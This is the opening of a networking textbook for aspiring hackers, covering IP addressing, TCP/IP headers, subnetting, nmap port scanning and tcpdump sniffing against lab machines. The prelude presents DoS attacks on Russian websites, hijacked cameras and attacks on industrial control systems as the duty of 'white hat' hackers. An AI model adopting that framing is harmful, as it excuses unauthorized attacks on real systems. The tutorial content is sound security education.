---
title: networking for hackers - Part 1
source: networking for hackers.md
category: development
---

Version 1.0

1 | P a g e

2 | P a g e

Copyright InfoSec Press 2023

All rights reserved. No part of this book may be reproduced or transmitted in any form or by any means,
electronic or mechanical.

3 | P a g e

4 | P a g e

Table of Contents

       Prelude

1. Network Basics

2. Sub-netting and CIDR

3. Network Analysis

4. Linux Firewalls

5. Wi-Fi Networks and Hacking

6. Bluetooth Networks

7. Address Resolution Protocol (ARP)

8. Domain Name Service (DNS)

9. Server Message Block (SMB)

10. SMTP

11. SNMP

12. HTTP

13. Automobile Networks

14. SCADA/ICS Networks

15. Radio Frequency (RF) Networks

Appendix A Cyberwarrior Wisdom

10

13

32

38

58

68

98

109

118

135

144

159

170

191

219

232

268

5 | P a g e

Table of Contents

Detailed

i.

Prelude

a. What is a White Hat Hacker
b. Our Actions and Activities in Ukraine

1. Network Basics

IP Addresses

a.
b. Classes of IP addresses
c. Public v Private IP addresses
d. DHCP
e. NAT
f. Ports
g. TCP/IP
h. Protocols
i.
IP
j. TCP
k. TCP Three-Way Handshake
l. UDP
m. Network Topologies
n. OSI Model
o. Exercises

2. Sub-netting and CIDR

a. Why sub-netting
b. Sub-Nets
c. Sub-net Masks
d. CIDR Notation

3. Network Analysis

a. Command –line (CLI) network analysis Tools
b. Network Sniffers
c.
tcpdump
d. Wireshark
e. Creating Filters in Wireshark
f. Following Streams
g. Statistics

10
11

11

13

14
15
15
16
16
18
20
21
22
23
25
26
26
29
31

32

33
33
34

35

38

39
42
43
48
51
55
57

6 | P a g e

h. Exercises

4. Linux Firewalls

iptables basics
a.
b.
Installing iptables
c. Configuring iptables
d. Creating rules
e. Exercises

5. Wi-Fi Networks (802.11)

a. Wi-Fi Basics
b. Wi-Fi Security Protocols
c. Wi-Fi Adapters for Hacking
d. Aircrack-ng commands
e. Anatomy of Wi-Fi Frames
f. Wireshark Filters for Wi-Fi Frames
g. Attacking Wi-Fi APs
h. Wi-Fi Exercises

6. Bluetooth Networks

a. Bluetooth Basics
b. Basic Linux Bluetooth Tools
c. Bluetooth Protocol Stack
d. Bluetooth Security
e. Bluetooth Hacking Tools
f. BlueBourne Attack
g. Exercises

7. Address Resolution Protocol (ARP)

a. How ARP Works
b. ARP Command
c. ARP Packets in Wireshark
d. How Hackers Use ARP
e. ARP Vulnerabilities
f. Exercises

8. Domain Name System (DNS)

57

58

59
60
61
63
66

68

69
70
71
73
75
78
80
97

98

99
101
101
102
103
104
108

109

110
110
112
113
114

117
118

7 | P a g e

a. Domain Names
b. How DNS Works
c. DNS Components
d. Packet Level Analysis of DNS
e. DNS Security and Vulnerabilities
f. DNSSec
g. Building a DNS Server (BIND)
h. Exercises

9. Server Message Block (SMB)

a. What is SMB
b. SMB Vulnerabilities
c. Building a SAMBA Server in Linux
d. Exercises

10. Simple Message Transfer Protocol (SMTP)

a. What is SMTP?
b. The Email Processing Model
c. Packet-Level Analysis of SMTP
d. Building an SMTP Server
e. Vulnerabilities in SMTP
f. Reconnaissance and Hacking SMTP
g. Exercises

11.Simple Network Management Protocol (SNMP)

a. Background on SNMP
b. SNMP Versions
c. Wireshark Analysis of SNMP
d. Abusing SNMP
e. Cracking SNMP strings
f. NSA Exploits against SNMP

12. HTTP

a. HTTP Protocol
b. Status Codes
c. HTTPS
d. Hacking Web App Authentication with BurpSuite

119
121
122
125
126
128
128
134

135

136
137
139
142

144

145
145
146
147
151
152
158

159

160
161
161
162
166
169

170

171
175
177
178

8 | P a g e

13. Automobile Networks

a. The CAN Protocol
b. CAN-UTILS or SocketCAN
c. Setting up a Virtual CAN  network
d. CAN Simulation
e. Reverse Engineer a CAN Packet
f. Key Fob Hacking
g. Exercises

14. SCADA/ICS Networks

a. SCADA Manufacturers
b. SCADA/ICS Communication Protocols
c. SCADA Security and Vulnerabilities

15. Radio Frequency Networks with SDR

a. Basic Radio Terminology
b. Radio Attack Methods
c. SDR for Hackers Hardware Comparison
d. What is SDR?
e. Setting Up our First SDR
f.
Intercepting Aircraft Communication
g. Air Traffic Position and Speed Monitoring
h. Spoofing Your GPS
i. Exercises

Appendix A Cyberwarrior Wisdom

191

192
196
199
200
210
215
218

219

219
220
224

232

235
235
236
241
245
250
251
258
267

268

9 | P a g e

Prelude

Welcome to the long-awaited Network Basics for Hackers! This is the fourth book in the series
Linux Basics for Hackers from me, Occupytheweb. Like Linux Basics for Hackers, I intend this
book to provide a basic framework, to begin with networking concepts, applications in Linux,
and the vulnerabilities of the various protocols.

We will start with basic networking and TCP/IP concepts and then progress to tools for
analyzing network packets and protocols. Then we will examine each of the major networking
protocols, build their application in a Linux system and analyze their weaknesses that can be
exploited by hackers. Finally, we will advance to some more advanced topics such as
Automobile Networks, SCADA/ICS networks, Radio Frequency (RF) networks, and Mobile
networks.

I’m assuming you have little or no networking background, but I AM assuming that you have
read Linux Basics for Hackers. We will be using Linux exclusively to build our various
applications (Linux commands are not explained in this book. Please refer to Linux Baiscs for
Hackers for basic Linux commands). In addition, we will be using Kali Linux as our platform.
Most all of the Kali Linux editions will work (examples in the book use various editions from
2019 through 2022.4). You can download Kali at kali.org (for instructions on installing Kali in a
virtual machine, see Linux Basics for Hackers). In addition, recent Kali editions require that you
use sudo before commands that require root privileges. Keep this is mind if you get a error
message saying “command not found.” You will probably need to precede the command with
sudo.

Reading my Getting Started Becoming a Master Hacker will also be helpful, but it is not
assumed here in this book. In chapters where we use Metasploit, you can gain the necessary
background in this widely used tool by reading my tutorials on Metasploit at www.hackers-
arise.com or reading my popular book Metasploit Basics for Hackers in the online bookstore at
Hackers-Arise.

I don’t pretend that this book will make you an expert network engineer, but I do hope it
provides you with some insights into these protocols and their weaknesses from a hacker or
security engineer’s perspective.

10 | P a g e

What is a White Hat Hacker?

Hackers-Arise, my website, is a white-hat hacker training site. This means that we use our skills
for good. Obviously, this means things like penetration testing and cyber-security. That is the
textbook definition of a white hat hacker and one you will see on many hacking/cybersecurity
certification exams.

Rather than be confined by the textbook definition, I prefer to expand the definition of a white
hat hacker. Having hacking skills is similar to having a superpower; you have responsibilities
and risks that go with it.

If your nation's government is authoritarian and censoring material over the Internet, I see it as
incumbent upon the white hat hacker--with our hacking superpowers--to help to keep the Internet
free and open. When governments feel threatened by their own people, they often shut down
Internet access and communication of its people. In such a case, a white hat hacker can help to
keep communication free and open. If a nation's government is illegally or unethically spying on
its own people, then it is the responsibility of the white hat hacker to help those people maintain
their privacy. If one authoritarian nation rolls its military over another free people, it is the
RESPONSIBILITY of the white-hat hacker to respond. Remember, we are the good guys, and
we have the power that few humans possess to protect freedom.

The white hat hacker is not ONLY a pentester/cybersecurity professional. The white hat hacker
is also a beacon and warrior for information freedom and human rights on the Internet.

Our Actions and Activities in Ukraine

As most of you know, Hackers-Arise has played a key role in the efforts to save Ukraine from
the actions of its brutal, former colonial master and neighbor, Russia. On February 24, 2022,
Russia attacked Ukraine in an effort to subjugate it to Kremlin’s rule. Within minutes, Hackers-
Arise led an effort of tens of thousands of hackers around the world to DoS (denial of service)
the Russian government and commercial websites. This included shutting down the stock
exchange in Russia and other governemt and commercial sites. We were able to limit availability
of these sites for about five weeks before Russian cybersecurity experts were able to thwart of
efforts. Russian officials have vowed to take revenge on us.

Immediately after the war started, we began to geo-locate the yachts of Russia’s oligarchs for
harassment and eventual seizure by NATO countries. Soon therafter (April 2022), we received a
request from Ukraine officials to hack the numerous cameras around the country to watch for
Russian war crimes. We did so and maintain access to these camera even as I write. We have
conducted cyberattacks against a number of industrial facilities (SCADA/ICS)  in Russia to limit
their ability to maintain their economic activity to sustain their war efforts.

In January 2023, at the request of Ukraine authorites, Hackers-Arise opened a
cybersecurity/hacker school in Kharkiv, Ukraine. This school is just 40km (25 miles) from the
Russian border. This represents the closest school to Russian territory in the world. It is designed

11 | P a g e

to train the next generation of security professionals/hackers to keep Ukraine and its neighbors
safe.

We believe that it our responsibility,as hackers, to use our abilities to keep the world safe. This is
what white hat hackers do.

12 | P a g e

Chapter 1

Network Basics

So many of you have written to me asking whether networking is a
key hacker skill. The unequivocal answer is YES! You are very
unlikely to be successful in this field without a fundamental

13 | P a g e

understanding of networks and networking. As a result, here is my Network Basics for Hackers
to help you get started!

IP Addresses

Internet Protocol addresses (IP addresses) make the world go 'round. Or, at least, enable us to
email, Zoom, watch YouTube videos, Tweet, and navigate the web. It's almost as important as
the world going around!

Each digital device (computer, laptop, phone, tablet, etc.) is assigned an IP address, and this is
what enables us to communicate and connect with it. Imagine an IP address as being similar to
your house address. Without that address, no one could find you and send you snail mail.

The IP address system we are presently using is known as IP version 4, or IPv4. It is made up of
32 bits of four octets (8 characters) or four groups of 8 bits (on/off switches).

Take, for instance, 192.168.1.101. Each of the numbers between the dots (.) is the decimal
equivalent of 8 bits. This means that we calculate the base 2 number (that computers use)
represented by the 8 bits and convert them to decimal numbers that humans are more accustomed
to working with (see the diagram below). Each one of the octets (8 bits) is capable of
representing numbers within the range 0 through 255 (2 to the 8th power).

14 | P a g e

Classes of IP Addresses

IP addresses are generally put into three classes, A, B, and C. The ranges of the
classes are as follows:

 Class A: 0.0.0.0 - 127.255.255.255
 Class B: 128.0.0.0 - 191.255.255.255
 Class C: 192.0.0.0 - 223.255.255.255

In  Chapter 2, we will address sub-netting and subnet masks that vary with these different IP
classes.

Public vs. Private IP Addresses

It's important to note that our IP address system has its limitations. The most significant restraint
is that there are not enough IP addresses to cover all devices that need to connect to the internet.
The IPv4 system we are working with now has only 4.3 billion IP addresses. With 7.5 billion
people on the planet and far more devices, that certainly is not enough.

As a result, a system was developed to reuse a group of IP addresses within a LAN—that are not
usable over the internet. These addresses can be used over and over again within each local area
network, but not over the internet, thereby conserving the number of IP addresses necessary to
keep the world going 'round.

These private addresses include:

15 | P a g e





192.168.0.0 - 192.168.255.255
10.0.0.0 - 10.255.255.255
172.16.0.0 - 172.16.255.255

You have probably seen the private IP addresses beginning with 192.168.xxx.xxx or
10.xxx.xxx.xxx on your Kali system when you type ifconfig.

This is your private IP that is only usable on the local area network. To communicate over the
internet, your IP address must be translated to a public IP by a NAT device (see NAT below).

DHCP

Dynamic Host Configuration Protocol (DHCP) assigns IP addresses dynamically. This means
that you do not have the same IP address all of the time. Most of the time, these IP address
assignments are on a local area network. Remember, on LANs; we use private IP addresses.
When each device is connected to the LAN, it must request an IP address. That device sends the
request to the DHCP server that assigns an IP address to that system for a fixed length of time,
known as a "lease."

16 | P a g e

Each time you connect to the LAN, you are likely to receive a different (dynamic) IP address,
but usually in the same range. For instance, 192.168.0.0 - 192.168.255.255.

NAT

Network Address Translation (NAT) is a protocol whereby internal private IP addresses are
"translated" to an external public IP address that can be routed through the internet to its
destination. Remember, private IP addresses of the systems inside the LAN cannot use their IP
addresses on the internet because they are not unique (every LAN uses basically the same IP
addresses inside their network).

The NAT device accepts requests to traverse the internet from an internal machine. It then
records that machine's IP address in a table and converts the IP address to the external IP address
of the router. When the packet returns from its destination, the NAT device looks into the saved
table of the original request. It forwards the packet to the internal IP address of the system that
made the original request within the LAN. When working properly, the individual systems and
users don't realize this translation is taking place.

17 | P a g e

For instance, the diagram above shows four computers with private IP addresses behind a device
that is serving as both a NAT device and a router (not uncommon). The devices use their private
IP addresses within the LAN, but when they want to communicate over the internet, the NAT
device translates it to one of the public IP addresses that are unique on the internet. In this way,
the routers along the way know exactly where to send the packets.

Ports

Ports are a kind of sub-address. The IP address is the primary address, and the port is the sub-
address. Using a well-worn but effective metaphor, think of the IP address as the street address
of a building and then the port as the apartment number. I need the street address to get to the
correct building, but I need the apartment address to find the individual person. This is similar to
ports. The IP address gets us to the right host, but the port takes us to the proper service, say
HTTP on port 80.

There are 65,536 (2 raised to the 16th power) ports. The first 1,024 are generally referred to as
the "common ports." Obviously, people don't remember all 65,536 ports (unless they are savant)
or even the 1,024 most common ports. As a hacker, security engineer, and/or network engineer,
though, there are a few ports that you should know by heart:

18 | P a g e

We can use a tool such as nmap to see what ports are open on a system. In this way, the security
engineer or hacker can see what ports are open and which services running on the target system.

For instance, to see all the ports open on a Metasploitable-2 system (an intentionally vulnerable
Linux system developed by the good people at Metasploit), we can run the following command;

kali > sudo nmap –sT <IP address of the target system>

19 | P a g e

nmap then reports back with the open ports and the default service on that port.

TCP/IP

Next, I want to introduce you to the basics of TCP/IP, i.e., Transmission Control Protocol (TCP)
and Internet Protocol (IP). These are the most common protocols used on the internet for
communication.

To become a proficient hacker, forensic investigator, or simply a good network engineer, you should
understand the structure and anatomy of these protocols. From my experience, many professionals in
these fields do not understand the basics of TCP/IP, which means that you will definitely have an
advantage over them if you DO understand.

20 | P a g e

When trying to create a new hacking tool or investigate a network attack, understanding these
protocols and their fields is essential. Otherwise, you will simply be wasting your time.

What Are Protocols?

Protocols are simply an agreed-upon way to communicate. For instance, we here on Hackers-
Arise have agreed upon the English language with all its rules and grammar as our way to
communicate. That is our protocol. If we did not have an agreed-upon way to communicate,
people would be using many languages, grammar, and rules, and none of us would understand
each other.

Protocols are similar. A protocol simply defines a way of communication with all its rules. These
rules are usually defined by an RFC (Request for Comments).

There are many, many protocols in use on the internet. These include TCP, IP, UDP, FTP,
HTTP, SMTP, etc., and each has its own set of rules that must be complied with to communicate
effectively (similar to the rules we use in communication via written languages).

Arguably the two most important protocols for use over the internet are IP and TCP, so let's take
a look at each of these.

21 | P a g e

IP (Internet Protocol)

IP, or Internet Protocol, is the protocol that is used to define the source and destination IP
address of a packet as it traverses the internet. It is often used in conjunction with other protocols
such as TCP; hence, the often-used conjunction, TCP/IP.

Let's look at an IP packet header and see what information it contains that can be useful to the
aspiring hacker and/or forensic investigator.

Row 1

 Version: This defines the version of IP, either v4 or v6.

 Type of Service (TOS): This defines the type of service of this packet. These include

IHL: Defines the header length.

minimize delay, maximize throughput, maximize reliability, and minimize monetary cost.
 Total Length: This defines the total length of the IP datagram (including the data) or the

fragment. Its maximum value is 65,535.

Row 2





Identification: This field uniquely identifies each packet. It can be critical in
reassembling fragmented packets.
IP Flags: This field defines whether the packet is fragmented (M) or not (D). The
manipulation of the field can be used to evade IDS and firewalls. Check out my tutorials
on nmap and hping3 on how we can manipulate packets to evade intrusion detection

22 | P a g e

systems and other security devices. It can also be used in conjunction with the Window
field to identify the operating system of the sender.

 Fragment Offset: This field is used when packets are fragmented. It defines where the

packets should be reassembled from the beginning of the IP header.

Row 3

 TTL: This is the "time to live." This defines how many hops across the internet before

the packet expires. It varies by the operating system making it helpful to identify the OS
of the sender.

 Protocol: This field defines what protocol is being used with IP. Most often, it will be 6

or TCP, 1 for ICMP, 17 for UDP, among others.

 Header Checksum: This is an error-checking field. It calculates the checksum (a simple

algorithm) to determine the integrity of the data in the header.

Rows 4 & 5



Source / Destination: These rows of the IP header are probably the most important part
of the header as it contains the source and destination IP address.

Row 6

 Options: This field is variable in length, and its use is optional (as you might expect).
 Padding: This field is used to fill out, if necessary, the remaining bits and bytes of the

header.

TCP (Transmission Control Protocol)

In the TCP header, there are numerous critical fields that the aspiring hacker and/or forensic
investigator should understand.

23 | P a g e

Row 1



Source Port / Destination Port: Probably most importantly, these are the source port
and destination port. These fields determine what port the communication came from
(source) and where it is going (destination).

Row 2



Sequence Number: The sequence number is generated by the source machine's TCP
stack and is used to make certain that packets are arranged in the proper sequence when
they arrive. It is also important in defeating MitM attacks.

Row 3

 Acknowledgment Number: This is an echo of the Sequence Number sent back by the
receiving system. It basically says, "I received the packet with the Sequence #." In this
way, the sender knows that the packet has arrived. If the sender does not receive an
Acknowledgment Number back in a fixed amount of time, it will resend the packet to
make certain the receiver gets the packet. In this way, TCP is reliable (in contrast, UDP
does not do this and is, therefore, unreliable).

Row 4

The fourth row has some critical information. Let's skip over the Data Offset and the Reserved
fields. That takes us to 8 bits near the middle of Row 4. These are the infamous flags of the
three-way handshake and nmap scans.

The first two bits, CWR and ECE, are beyond the scope of this lesson. The next six bits are the
URG, ACK, PSH, RST, SYN, and FIN flags. These flags are used by TCP to communicate;

24 | P a g e

SYN: The opening of a new connection.


 FIN: The normal, "soft" closing of a connection.
 ACK: The acknowledgment of a packet. All packets after the three-way handshake

should have this bit set.

 RST: The hard-close of a connection and is usually used to communicate that the packet

has arrived at the wrong port or IP.

 URG: This flag indicates that the following data is urgent.
 PSH: Push the data past the buffer to the application.

If you are familiar with nmap or hping3 as recon tools, you have used scans utilizing all of these
flags. By creating packets with flag combinations that should not be seen in the wild, we may be
able to elicit a response from a very secure system or even evade detection.

 Window Size: In some diagrams, this is simply described as the Window field. Its role is
to communicate the size of the window that the TCP stack has to buffer packets. This is
the way that TCP manages flow control. From a recon or forensics perspective, this field
alone can be enough to identify the OS that sent the packet. This field varies from OS to
OS and even from SP to SP. Given this bit of information, one can predict with about
80% accuracy the OS that sent the packet. In fact, it is this field and a few others (DF and
TTL in the IP header) that operating system fingerprinters such as p0f use to identify the
OS.

Row 5

 Checksum: This field uses a simple algorithm to check for errors. In essence, it is an

integrity checker.

 URG Pointer: This field points to the last byte of the sequence number of urgent data.

The URG flag must be set in conjunction to activate this field.

Row 6

 Options: Like the IP header, the TCP header has an options field to be used if necessary,

and it is varying length.

 Padding: The padding is necessary to bring the TCP header to a multiple of 32 bits.

TCP Three-Way Handshake

Every TCP connection starts with a 3-way handshake.  The handshake begins with a client
sending a packet with the SYN flag set saying, “Hello, I want to talk to you” the server responds
with a packet with the SYN and ACK flags set saying, “Hi, I’m willing and able to chat,” and

25 | P a g e

then finally, the client sends a packet with the ACK flag set that acknowledges the response of
the server, and then the data transfer can begin.

UDP

User Datagram Protocol or UDP is a connectionless protocol (vs. TCP, which is connection-
oriented and requires a connection such as the 3-way handshake as seen above). It is more
lightweight than TCP since it doesn’t have the overhead of assuring a connection and making
certain that each packet arrives. UDP simply sends packets and forgets about them. This works
great in applications where you want efficiency and no one packet is critical such as streaming
music or video.

Some of the key protocols that use UDP include DNS (only for queries), SNMP for network
device management, and NTP for network time synchronization.

When scanning for UDP ports with tools such as nmap, it can take a bit longer as UDP does not
have a response for lost packets or closed ports. Nmap simply waits a specified time, and if no
response is returned, it assumes the port is closed. You can scan for UDP nmap with the
following command

kali > nmap –sU <IP Address>

Network Topologies

When devices are connected together, there are several options for the physical layout of the
devices. This physical layout can be very important in optimizing the distance, latency,
congestion, and availability of any two nodes on the network. This physical configuration is
known as topology.

Ring Topology

26 | P a g e

The original topology in the early systems was a bus topology. Each of the devices is strung
together in a single line. Each device can tap into the bus to send and receive packets. Every
node can see every packet sent over the bus. Each device has to examine each packet to
determine if the packet is intended for them. The advantage to the bus topology is that it is cheap
and simple, while the disadvantage is that on a busy network, it can easily become congested.

Star Topology

The star topology is the most popular topology for local area networks (LAN). In the star
topology, there is a server at the center of the star, and the clients all connect to the server. The
advantage of this topology is that the connections to each of the clients are independent, and if
one client or its connection is broken, the others clients can still communicate with the server.

Ring topology

The ring topology sends the packets around a ring, and only the client the packet is intended for
can grab the packet from the ring. The advantage of the ring topology is that it is simple and
inexpensive, but if the ring is broken, all clients cannot receive any communication.

27 | P a g e

Mesh Topology

The mesh topology has many connections between each device on the network. This means that
a packet has a variety of paths to take to its destination. This gives the network resiliency in the
case that one cable or path is broken. This is similar to how our modern internet is connected;
packets have multiple paths they can take to the target system. In addition, mobile apps such as
Briar are able to setup a network using a mesh topology and Wi-Fi or Bluetooth to create an
alternate network for communication.

28 | P a g e

The OSI  Model

The OSI and the TCP models are the most common models to understand the way that these various
protocols work together. Many novices tend to minimize the importance of these models as they initially
don’t seem to have any practical importance to networking systems. In reality, you should at least have a
basic understanding of these models as you will hear references to them repeatedly in your career, such
as, “this is a layer three switch.” This would be unintelligible without a rudimentary understanding of the
OSI model.

Let’s begin with the OSI model. The diagram below displays the seven layers and the basic use of that
layer in network communication.

As you can see, there are seven layers to the OSI model, the Application layer, the Presentation layer, the
session layer, the Transport layer, the Network layer, the Data link layer, and finally, the Physical layer.
The figure above details the various layers and the protocols and activities associated with each. To help
you remember the various layers of this model, there are at least two mnemonic devices to help. If we
start from the top and work our way down,  we can take the first letter of each layer, namely, A, P, S,T, N,
D, and P. Many people remember these layers by using the mnemonic device;

All

People

Seem

29 | P a g e

To

 Need

Data

Processing.

If you remember that phrase, you can likely remember the various layers. If we work our way up the
model, we get P, D, N, T, S, P, and A. Then we use the phrase Please Don’t Throw Sausage Pizza Away.
Feel free to use either or make up your own. The key is to remember the seven layers. I hope this helps.

The OSI Model from a Cybersecurity Perspective

The attacks against the protocols in this model can be categorized as follows;

30 | P a g e

The Application layer generally includes applications such as a browser, word processors, and
other applications.  This layer’s most important attacks are likely to be exploits. These are
attacks that can often embed the hacker’s code within the application to take control of the
application and the system.

At the Presentation layer, the most concerning attack is phishing or sending emails to various
people with malicious links.

At the Session layer, the most important attack is hijacking. Hijacking is where an attacker can
take over an existing session established legitimately by the user.

At the Transport layer, the hacker often does their reconnaissance at this layer.

At the Network layer, the attackers can conduct Man-in-the-Middle MiTM) attacks where they
place themselves between a legitimate user and a server, thereby eavesdropping on the traffic
and possibly even altering it.

At the Data Link Layer, the attacker can spoof the MAC addresses, the globally unique address
stamped on every networked device and essential to the proper functioning of a LAN (see ARP).

Finally, the Physical layer can be attacked using sniffing. Sniffing is the practice of watching
and analyzing network traffic (see Wireshark and Sniffers in Chapter 4).

We will look more closely at each of the attacks against the network protocols and layers as we
proceed through this book.

Now that you have a basic understanding of networks, IP addresses, and the OSI model, take a
few minutes to test your knowledge with the questions below.

Exercises

1. What is the difference between public and private IP addresses?  Is 172.16.242.63 a

public or private IP address?

2. Use ifconfig to determine what IP address your system is using.
3. Do an nmap scan against your system. What ports are open?
4. What are the 6 TCP flags, and what are they used to do?
5. What are the most common attacks against the network layer?

31 | P a g e

Chapter 2
Subnetting and CIDR Notation

To begin, let's state the obvious. First, to become a network
engineer or network security engineer, you should have an
understanding of sub-netting. Second, there are a number of
tools that are convenient and useful in calculating your subnet,
including subnet calculators. This having been said, calculators
and other tools are no substitute for understanding sub-netting.
That is what we intend to do here.

32 | P a g e

Why Sub-netting?

Sub-netting lets network administrators use the 32 bits in IPv4 IP address space more efficiently.
They can create sub-nets within a Class A, B, or C network. This enables the administrator to
create networks with more realistic host numbers.

Sub-netting provides a flexible way to designate which portion of the IP address represents the
host IP and which portion represents the network ID. In addition, even if a single organization
has thousands of devices, they don't want them all running on the same network ID. The network
would slow dramatically. By dividing up the network, you can have different physical networks
and broadcast domains.

Sub-nets

A subnet is a network within a network, namely a Class A, B, or C. Subnets are created by using
one or more of the host bits to extend the network ID. As you know, Class A networks have an

33 | P a g e

8-bit network ID, Class B has a standard 16-bit network ID, and Class C has a standard 24-bit
network ID. Subnetting enables us to create network ID's of any size.

A network mask, or netmask, is a binary mask that is applied to an IP address to determine
whether two IP addresses are in the same subnet. A network mask works by applying binary
AND operations between the IP address and the mask.

Sub-Net Masks

Subnet masks use the 32-bit structure of the IP address. The subnet mask tells us which bits are
for the Network ID and which bits are for the host ID. When the subnet mask bit is set to one,
this means it is part of the network. A bit marked as zero is part of the host ID. The diagram
below is meant to demonstrate this process of bit-wise AND operation between and IP address
and its mask.

34 | P a g e

CIDR Notation

CIDR, or Classless Inter-Domain Routing notation, is a way of representing an IP address and
the network mask associated with it. CIDR notation specifies an IP address, a slash (/), and a
decimal number such as 192.168.1.0/24, where the 24 represents the number of bits in the
network mask. Of course, the number of bits can vary depending on the number of sub-nets.

Our Scenario

To demonstrate this principle, let's create a scenario. Let's assume we have a Class C network,
say 192.168.1.0. That means we have 254 host addresses available (1-254). What if we needed
five different networks with no more than 30 hosts per network?

We can create smaller networks by borrowing bits from the host portion of the address.

35 | P a g e

This provides us with a netmask like that below.

Those 3 bits would give us 2 to the 3rd power (8) -2 (we need to subtract for the reserved
network and broadcast IP) subnets or 6. There would be 5 bits left in the network portion of the
address or 2 to the 5th power (32) - 2 or 30 hosts per subnet.

The calculation of the subnet mask after borrowing those 3 bits would be;

36 | P a g e

Summary

Subnetting is a key skill for every network engineer or anyone trying to do network forensics or
network analysis. Hopefully, this brief chapter sheds some light on the subject and at least leaves
you conversant in this subject matter.

37 | P a g e

Chapter 3

Network Analysis

There are a large variety of tools available for
analyzing your networks and network traffic. In this
chapter, we will look at a few of the most widely
used. Some you are already familiar with, such as
ifconfig, and others may be new to you. It is my hope
that by the end of the chapter, you will be familiar

38 | P a g e

with the key tools to analyze network traffic and understand what is taking place on your network.

Command Line Tools

Let’s begin with the command-line tools. In Chapter 1, I introduced you to ifconfig (ipconfig in
Windows). This command is key to retrieving critical information about your network. Let’s try it in our
Kali Linux.

kali > ifconfig

Where:

Is the IPv4 private IP address
Is the netmask

1.
2.
3. The broadcast IP address
4. The IPv6 address
5. The MAC address
6. The loopback or localhost IP address

Ping is one of the most important commands to determine whether another system is live on your network
or the Internet. Ping will accept either an IP address or a domain name. For instance, to ping hackers-
arise.com, you simply enter;

kali > ping hackers-arise.com

39 | P a g e

As you can see in the screenshot above, the ping command sends a packet to the domain server for
www.hackers-arise.com, and the server responds. In this way, we know it is up and functional. It also
responds with its IP address. If we know the IP address of the host or server, we can simply use that IP to
ping, such as;

kali > ping 185.230.63.107

netstat

Another handy command-line tool is netstat (network statistics). Netstat shows us all the connections
coming or going from our system. This can help with monitoring and troubleshooting network
connections. In some cases, I have used it to find malware connecting to my system.

kali > netstat –a

40 | P a g e

Your system probably looks different, but you can see every connection to your system. There may be
hundreds!

To display all the TCP connections, you can use the to –t switch; for all the UDP connections, you can
use the –u switch and for all the listening connections, the –l switch, as seen below.

If you are looking for a specific connection, you can pipe (see Linux Basics for Hackers)  the netstat
command to grep and filter for key words. If you have an Apache web server running on your system
listening for connections, you can check by piping netstat –a to grep http, such as;

kali > netstat –a | grep http

ss is a similar tool that can display even more information than netstat in a more readable format. When
we run the ss command, we get a display of very connection to our system with the local address and port,
as well as the port on the peer system.

41 | P a g e

Network Sniffers

A network sniffer—sometimes referred to as a packet analyzer, protocol analyzer, or network
traffic analyzer—can intercept and analyze network traffic that traverses a digital network. These
sniffers can be invaluable to the network or security engineer, the forensic investigator, and in some
cases, the hacker. For instance, if an application sends passwords over the network unencrypted, the
hacker may be able to sniff and view the passwords. Since only a few applications send passwords
unencrypted in our security-conscious era, the value of the sniffer to the hacker is a bit more nuanced.

For some exploits/hacks, such as DNS or MiTM attacks, analysis of the LAN traffic can be crucial to
their success, making the sniffer invaluable. Besides, sniffing a target’s traffic can reveal what sites they
are visiting, their cookies, their user agent, or even their email messages (if unencrypted or you have the
resources to decrypt the message).

Many tools are capable of network sniffing, including:

1. SolarWinds Deep Packet Inspection and Analysis Tool
2. Tcpdump
3. Windump
4. Wireshark
5. Network Miner
6. Capsa
tshark
7.

In this chapter, we use two of the most popular network sniffer/analyzers: tcpdump and Wireshark. In
addition, we use Wireshark to dig deep into the NSA’s EternalBlue exploit to understand exactly how it
works.

42 | P a g e

Controversial Use of Sniffers

For over twenty years, the Federal Bureau of Investigation (FBI) in the United States has used a tool they
term “Carnivore." This tool is used to sniff and analyze the traffic of people suspected of committing
crimes. It is very controversial but legal, as it allows the FBI to eavesdrop on network traffic without a
warrant.

Prerequisites to Sniffing

It's critical to point out that to effectively use a network sniffer, your network interface card (NIC) should
be in promiscuous mode. This means that your NIC picks up ANY packet traversing the network.
Usually, NICs only pick up packets that are intended for their particular MAC (globally unique physical)
address.

The other critical point to understand with network sniffing is that the standard file format for sniffing is
.pcap (packet capture). This means your system must have a library (a bit of reusable code) to put the
packets in this format. These libraries are libpcap on your Linux system or Winpcap on Windows system.

tcpdump in Action

Before we examine the powerful GUI-based sniffer Wireshark, let's take a brief look at the command line
sniffer, tcpdump. Tcpdump was among the very first (1988) Linux/UNIX based sniffers. Although it may
not be the easiest sniffer to use, its versatility and lightweight design make it worth knowing. Tcpdump
can be particularly useful if you have to analyze a non-GUI based system or a remote system where a
GUI would be slow, inefficient, and not very stealthy.

To start tcpdump, enter;

kali >tcpdump

As you can see, as soon as you enter the command, tcpdump, packets begin to flow across your screen.
These packets are largely communication between your Kali system and the LAN gateway.

Let's try creating some traffic to analyze. For instance, let's try sending a ping (ICMP echo request) to
your Windows 7 system from one terminal and running tcpdump from the other.

43 | P a g e

kali > ping 192.168.0.114

kali > tcpdump

Let’s zoom in on the tcpdump screen so we can see detail there.

As you can see, tcpdump displays the protocol (ICMP) and the type (echo request and echo reply).

If we want to capture the output to a file where we can analyze it at a later time, we can use the –w option
followed by the file name.

kali > tcpdump –w myoutput.cap

Filter by IP Address

We may want to filter out all the traffic except the traffic coming back from the Windows 7 system.
Tcpdump, developed by researchers at the Lawrence Livermore National Laboratory in Berkeley, CA,
running BSD Unix, utilizes the Berkeley Packet Filter (BPF) format to create filters.

44 | P a g e

We can create that filter for the Windows 7 IP address by entering:

kali > tcpdump host 192.168.0.114

Now you can see just the traffic coming and going to the Windows 7 system as we have filtered out all
the other traffic.

Now, let's connect to the Apache web server on our Kali machine from your Windows 7 system. First,
start the Apache2 web server built into Kali.

kali > systemctl apache2 start

This starts your Apache webserver. Next, start tcpdump again on your Kali system.

kali > tcpdump host 192.168.0.114

Now, open a browser on your Windows 7 system and navigate to the Kali system IP address.

You should begin to see packets appearing in the tcpdump terminal.

Note that we can see the three-way TCP handshake in the highlighted polygon. You can see first an “S”
flag, then an “S.” flag (tcpdump represents the A or ACK flag with a “ .“), and then a “.”  flag or written
another way, S-SYN/ACK-ACK.

45 | P a g e

This filter displays traffic coming and going from our Windows 7 system. If we want to filter for just the
traffic coming FROM our Windows 7 system, we can create a filter like;

kali > tcpdump src host 192.168.0.114

Now, we are only seeing the traffic coming (src) from our Windows 7 system (192.168.0.114).

Filter by Port

What if we wanted to filter out all the traffic except those going to a particular port on our Apache web
server? Let’s try to filter out everything except traffic going to port 80 (HTTP). If we use the –vv option
